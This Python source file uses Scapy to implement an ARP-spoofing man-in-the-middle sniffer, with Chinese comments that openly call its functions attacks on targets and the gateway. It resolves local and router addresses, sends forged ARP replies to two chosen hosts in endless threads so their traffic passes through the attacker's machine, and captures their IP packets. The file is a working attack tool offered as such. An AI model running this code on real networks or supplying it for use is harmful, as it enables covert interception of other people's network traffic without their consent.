import threading
import time

from scapy.arch import get_if_addr, get_if_hwaddr
from scapy.config import conf
from scapy.layers import l2, inet
from scapy.packet import Packet
from scapy.sendrecv import sendp, srp, sniff


class Sniffer:
    def __init__(self, iff=conf.iface):
        self.local_ip = get_if_addr(iff)  #获取本地ip
        self.local_mac = get_if_hwaddr(iff)  #获取本地mac
        self.router_ip = conf.route.route('0.0.0.0')[2]  #获取路由器ip
        self.router_mac = l2.getmacbyip(self.router_ip)  #获取路由器mac
        print("local mac :", self.local_mac)
        print("local ip  :", self.local_ip)
        print("router mac:", self.router_mac)
        print("router ip :", self.router_ip)
        self.routing_table = dict()  #dict() 函数用于创建一个字典。储存路由表
        self.targets = set()  #set() 函数创建一个无序不重复元素集。储存被攻击对象

    def add(self, target_ip: str):  #如果目标ip再路由表中，则把该ip加入到攻击目标中
        self.routing_table[target_ip] = l2.getmacbyip(target_ip)
        self.targets.add(target_ip)

    def delete(self, target_ip: str):  #删除被攻击对象
        self.targets.remove(target_ip)

    def start(self, on_recv: callable):  #开始攻击
        print("start sniffing on %d hosts" % len(self.targets))
        for target_ip in self.targets:
            print(target_ip,self.routing_table[target_ip])
        threading.Thread(target=self.cheatRouter).start()  #欺骗网关
        threading.Thread(target=self.cheatTargets).start()  #欺骗攻击对象
        sniff(lfilter=self.filter, prn=on_recv)  #抓自己主机和欺骗主机的包

    def cheatRouter(self):  #欺骗网关
        targets_list = {}
        for target_ip in self.targets:
            targets_list[target_ip] = self.routing_table[target_ip]
        key_list = list(targets_list.keys())

        while(True):
            p = l2.Ether(dst=self.routing_table[key_list[1]]) / \
                l2.ARP(op=2, psrc=key_list[0], pdst=key_list[1], hwsrc=self.local_mac)
            print(self.routing_table[key_list[0]], key_list[0])
            print(self.routing_table[key_list[1]], key_list[1])
            sendp(p, verbose=False)
            time.sleep(1)

    def cheatTargets(self):  #欺骗攻击对象
        targets_list = {}
        for target_ip in self.targets:
            targets_list[target_ip] = self.routing_table[target_ip]
        key_list = list(targets_list.keys())

        while(True):
            p = l2.Ether(dst=self.routing_table[key_list[0]]) / \
                l2.ARP(op=2, psrc=key_list[1], pdst=key_list[0], hwsrc=self.local_mac)
            sendp(p, verbose=False)
            time.sleep(1)

    def filter(self, p: Packet):  #过滤攻击主机
         #IP层
        return p.haslayer(inet.IP) and (p[inet.IP].src in self.targets or p[inet.IP].dst in self.targets)
